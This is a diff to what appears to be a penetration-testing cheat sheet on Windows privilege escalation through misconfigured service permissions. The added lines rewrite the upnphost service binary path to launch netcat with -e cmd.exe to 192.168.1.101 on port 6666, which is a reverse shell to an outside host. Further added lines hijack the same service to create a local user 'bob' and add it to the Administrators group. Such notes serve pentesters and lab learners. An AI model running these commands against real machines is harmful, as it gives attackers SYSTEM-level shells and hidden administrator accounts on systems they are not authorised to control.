@@ -578,8 +578,11 @@ https://toshellandback.com/2015/11/24/ms-priv-esc/
 
 ```
 sc qc upnphost
-sc config upnphost binpath= "C:\Inetpub\nc.exe
-192.168.1.101 6666 -e c:\Windows\system32\cmd.exe"
+sc config upnphost binpath= "C:\Inetpub\nc.exe 192.168.1.101 6666 -e c:\Windows\system32\cmd.exe"
+sc config upnphost obj= ".\LocalSystem" password= ""
+sc config upnphost depend= ""
+sc upnphost stop
+sc upnphost start
 ```
 
 OR a msfvenom revshell (```.vbs``` or ```.exe```)
@@ -587,24 +590,19 @@ OR a msfvenom revshell (```.vbs``` or ```.exe```)
 
 #### user add
 
-```obj= "DOMAIN\User" password= "Password01"``` :
+
 ```
+sc qc upnphost
+sc config upnphost binpath= "net user bob Password01 /add"
 sc config upnphost obj= ".\LocalSystem" password= ""
 sc config upnphost depend= ""
-Sc upnphost stop; sc upnphost start
+sc upnphost stop
+sc upnphost start
+sc config upnphost binpath= "net localgroup Administrators bob /add"
+sc upnphost stop
+sc upnphost start
 ```
 
-OR ```“net user /add”``` 
-
-netuser binpath:-
-```
-sc config PFNET binpath= "net user rottenadmin P@ssword123! /add"
-sc stop PFNET
-sc start PFNET
-sc config PFNET binpath= "net localgroup Administrators rottenadmin /add"
-sc stop PFNET
-sc start PFNET
-```
 
 
 #### Unquoted Service Paths - race condition
